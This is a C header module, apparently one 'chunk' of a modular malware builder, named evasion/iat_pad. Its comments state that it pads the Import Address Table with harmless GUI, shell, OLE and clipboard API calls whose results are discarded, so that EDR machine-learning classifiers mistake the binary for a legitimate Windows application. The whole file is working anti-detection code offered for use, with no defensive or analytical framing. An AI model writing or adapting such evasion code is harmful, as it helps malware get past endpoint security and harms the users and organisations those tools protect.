// chunk: evasion/iat_pad
// depends: (none)
// provides: iat_pad_init
// headers: windows.h,shlobj.h
// risk: none
// note: Adds benign-looking API imports to shift ML classifier scores.
//       EDR ML models analyze the Import Address Table (IAT) to classify binaries.
//       Malware typically imports from a narrow set of security/network DLLs.
//       Adding imports from GUI/utility DLLs (COMCTL32, OLEAUT32, GDI32) makes
//       the binary's import profile look like a legitimate Windows application.
//       Each call is real but discards the result — the linker keeps the import.

#ifndef CHUNK_IAT_PAD
#define CHUNK_IAT_PAD

#include <windows.h>
#include <shlobj.h>

#pragma comment(lib, "gdi32")
#pragma comment(lib, "ole32")
#pragma comment(lib, "user32")
#pragma comment(lib, "shell32")

static volatile DWORD _iat_sink = 0;

static void iat_pad_init(void) {
    /* GUI APIs — makes binary look like a desktop application */
    HDC hdc = GetDC(NULL);
    if (hdc) {
        _iat_sink += GetDeviceCaps(hdc, HORZRES);
        _iat_sink += GetDeviceCaps(hdc, VERTRES);
        ReleaseDC(NULL, hdc);
    }

    /* Shell APIs — common in legitimate apps */
    WCHAR path[MAX_PATH];
    if (SHGetFolderPathW(NULL, 0x001a, NULL, 0, path) == S_OK) /* CSIDL_APPDATA */
        _iat_sink += (DWORD)path[0];

    /* OLE/COM — nearly all legitimate Windows apps initialize COM */
    _iat_sink += (DWORD)(ULONG_PTR)OleInitialize(NULL);
    OleUninitialize();

    /* Standard user32 desktop queries */
    _iat_sink += GetSystemMetrics(SM_CXSCREEN);
    _iat_sink += GetSystemMetrics(SM_CYSCREEN);
    _iat_sink += (DWORD)(ULONG_PTR)GetDesktopWindow();

    /* Clipboard — many apps check clipboard format */
    _iat_sink += IsClipboardFormatAvailable(CF_TEXT);
}

#endif
